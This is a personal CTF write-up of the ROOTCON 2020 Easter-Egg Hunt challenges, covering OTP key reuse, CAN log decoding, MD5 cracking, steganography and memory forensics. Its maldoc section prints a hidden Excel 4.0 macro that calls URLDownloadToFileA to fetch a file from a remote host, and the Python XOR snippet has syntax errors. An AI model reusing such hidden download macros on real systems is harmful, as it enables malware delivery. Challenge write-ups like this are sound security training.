---
layout: post
title: ROOTCON 2020 Easter-Egg Hunt Flags
subtitle: This is my write-up on how I managed to solve some challenges on ROOTCON 2020 Easter-Egg Hunt.
excerpt: This is my write-up on how I managed to solve some challenges on ROOTCON 2020 Easter-Egg Hunt.
comments: false
thumbnail-img: https://i.imgur.com/w1S4Qff.png
categories:
- CTF 
---

This is my write-up on how I managed to solve some challenges on ROOTCON 2020 Easter-Egg Hunt. The challenges include, but not limited to Forensics, Crypto, Malware Analysis and Puzzles. The objective is to solve the challenges and acquire the flag.

![](https://i.imgur.com/w1S4Qff.png){: .mx-auto.d-block :}

## Easter-Egg Challenges

### Time Egg Solution

Browse on the given link to learn more about the challenge.

![](https://i.imgur.com/aBk1SYR.png){: .mx-auto.d-block :}

From there you are given two messages:

~~~
: 83d7f7966225c71b556cfd1fa28aa1cb364903c74bfad82400a5b8326ebf110cf610Q: 8380cb903366dd4b7822ba48a9dacf8b6b4b6aa81df1f14b46afd4736ae9111ee2
~~~

The idea of the challenge is to ![](https://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse) [take advantage of one-time pad key re-use].

XOR the two given messages.
~~~
import sys
 def sxor(s1,s2):    
     return ''.join(chr(ord(a) ^ ord(b) for a,b in zip(s1,s2)
 s1 = "83d7f7966225c71b556cfd1fa28aa1cb364903c74bfad82400a5b8326ebf110cf610".decode('hex')
 s2 = "8380cb903366dd4b7822ba48a9dacf8b6b4b6aa81df1f14b46afd4736ae9111ee2".decode('hex')
 s3 = sxor(s1, s2)
 print s3.encode('hex')

#result: 00573c0651431a502d4e47570b506e405d02696f560b296f460a6c410456001214
~~~

[XOR the generated string, with a known plaintext, which in this case, a part of the flag: "rc_easter{". This will result on getting the "r4cc00n5_5" which is part of the key.](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'rc_easter%7B'%7D,'Standard',false)&amp;input=MDA1NzNjMDY1MTQzMWE1MDJkNGU0NzU3MGI1MDZlNDA1ZDAyNjk2ZjU2MGIyOTZmNDYwYTZjNDEwNDU2MDAxMjE0)

![](https://i.imgur.com/xM2o4mk.png){: .mx-auto.d-block :}

The difficult part of the task is you need to make intelligent guesses on trying to complete the key. Eventually, this will result on getting "r4cc00n5_5t0l3_4ll_0f_y0ur_3gg5!" as the key and XORing it with the generated XOR string will result on getting the flag.

**Note:** [I used r4cc00n5_5t0l3_4ll_0f_y0ur_3gg5!i as the full key as I based the flag on its given flag format which is: rc_easter{your_fl4g_h3re!}](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'r4cc00n5_5t0l3_4ll_0f_y0ur_3gg5!i'%7D,'Standard',false)&amp;input=MDA1NzNjMDY1MTQzMWE1MDJkNGU0NzU3MGI1MDZlNDA1ZDAyNjk2ZjU2MGIyOTZmNDYwYTZjNDEwNDU2MDAxMjE0)

![](https://i.imgur.com/5YI6nuS.png){: .mx-auto.d-block :}

**Flag: rc_easter{3ggc1t1n6_0TP_3x3rc153}**

### Space Egg Solution

Install [can-utils](https://github.com/linux-can/can-utils), then use **log2asc** to convert the log files in friendly format.   

Examine the ASC file, then from it, take note of the 400, 401, 402 and 403 events Rx values (as these events stands out). 

![](https://i.imgur.com/S9Is3Q7.png){: .mx-auto.d-block :}

Decode the hex values to get the flag.
(73 70 61 63 65 73 61 74 65 6C 6C 69 74 65 73 68 61 76 65 63 61 6E 74 6F 6F) = spacesatelliteshavecantoo.

**Flag: rc_easter{spacesatelliteshavecantoo}**

Alternatively, you can use **canplayer** to replay log file, and fire up Wireshark to examine the traffic while examining the data. Combining parts of it will also result on getting the flag.

![](https://i.imgur.com/6vBsxK5.png){: .mx-auto.d-block :}

### Power Egg Solution

Build a wordlist that would satisfy the password requirements. (eg. year-goon-color). Then crack the given md5 hash using hashcat or john the ripper. 

This will result on finding that "**2169-ShipCode-eminence**" password match the given hash. 

![](https://i.imgur.com/Jmor5Ik.png){: .mx-auto.d-block :}

Use the password to decrypt the "the_power_egg.enc" file using openssl with "2169-ShipCode-eminence" as the decryption password. 

This will result on getting a PNG file with a QR code. Open the file and use QR code scanner to view the flag.

![](https://i.imgur.com/ttrLI1j.png){: .mx-auto.d-block :}

**Flag: rc_easter{p0w3r_1s_n07h1n6_w17h0u7_c0ntr0L}**

### Reality Egg Solution

Examining the file, shows that it has a behavior similar to ![](https://blog.intel471.com/2020/03/25/analysis-of-an-attempted-attack-against-intel-471/) [**Zloader** banking trojan (aka Terdot]. 

Edit the hex format of the file to unhide the hidden sheet. This will result on being able to see the **hidden Sheet2**. More information on this available on [Excel Maldocs Hidden Sheets](https://isc.sans.edu/forums/diary/Excel+Maldocs+Hidden+Sheets/25876/) article.

![](https://i.imgur.com/cSb5v5R.png){: .mx-auto.d-block :}

Examine the column section, and notice that the **Column "N"** is hidden. Unhide the column and then jump to the (starting) 500th row.

![](https://i.imgur.com/GqhtTT0.png){: .mx-auto.d-block :}

Then convert the decimals values to ASCII to get the command below:
~~~

=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://easteregg.rootcon.net/sFpWgx9WkHQQ542K/36xQCWUDNaJpdbTB","c:\Users\Public\flag.txt",0,0)
~~~

Browse to http://easteregg.rootcon.net/sFpWgx9WkHQQ542K/36xQCWUDNaJpdbTB to view the flag.

**Flag: rc_easter{r34l1ty_15_0ft3n__d1s4pp01nt1ng}**

### Soul Egg Solution

Browse to given link to view the image. 

![](https://i.imgur.com/GfHDLg4.jpg){: .mx-auto.d-block :}

The image shows strings that are encoded using **Atlantean Language**. 

Just use any decoder like 
![decoder](https://i.imgur.com/gdQmdNv.gif){: .mx-auto.d-block :}
or https://www.dcode.fr/atlantean-language to get the flag.

**Flag: rc_easter{sacr1f1c3h4lft0me}**

### Mind Egg Solution

Note that this is only partial solution as I wasn't able to complete this challenge.

Use zero-width characters decoder on "To Wanda.txt" file to acquire second part of the secret which is: **h_my_l0v3**. I've used [https://330k.github.io/misc_tools/unicode_steganography.html](https://330k.github.io/misc_tools/unicode_steganography.html) (opens in a new tab).

![](https://i.imgur.com/TPrNfnc.png){: .mx-auto.d-block :}

Then use volatility on the vision file (memory dump) to acquire the encoded first part of the secret which is: MUlPdVg1dTsybDJldW9MPSg/SkJGIy11bURKc2AvQDdHMyU3ODczKEByMg==. 

![](https://i.imgur.com/gIOVUZ8.png){: .mx-auto.d-block :}

Stucked on hint.txt particularly on the "**def**" part to fully decode the first part (all others are just using base encoding schemes, e.g. base64 -&gt; base85 -&gt; base58). 

Though the my_treasures zip file link can just be found by using strings on the vision memory dump file and searching for http. 

This will result on finding out: https://uploadfiles[dot]io/kiyqnnt9 which is the link to download the my_treasures file.

**Note:** Solved this after the event, and below is the solution.

Turns out the the &quot;def&quot; was raw inflate which would result on getting the first part of the secret: sc4rl37_w1tc (opens in a new tab) [Turns out that the "**def**" was **raw inflate** which would result on getting the first part of the secret: **sc4rl37_w1tc**](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base85('!-u')From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)Raw_Inflate(0,0,'Adaptive',false,false)&amp;input=TVVsUGRWZzFkVHN5YkRKbGRXOU1QU2cvU2tKR0l5MTFiVVJLYzJBdlFEZEhNeVUzT0RjektFQnlNZz09).

![](https://i.imgur.com/r8qYFZG.png){: .mx-auto.d-block :}

Use the "sc4rl37_w1tch_my_l0v3" secret as the password to unzip the my_treasures file. This would result on several image files. One of the file contains a QR code which is the flag.

![](https://i.imgur.com/33w0K9Y.png){: .mx-auto.d-block :}

**Flag: rc_easter{y0u_c0uld_n3veR_huRt_m3_I_ju57_f33l_y0u} **

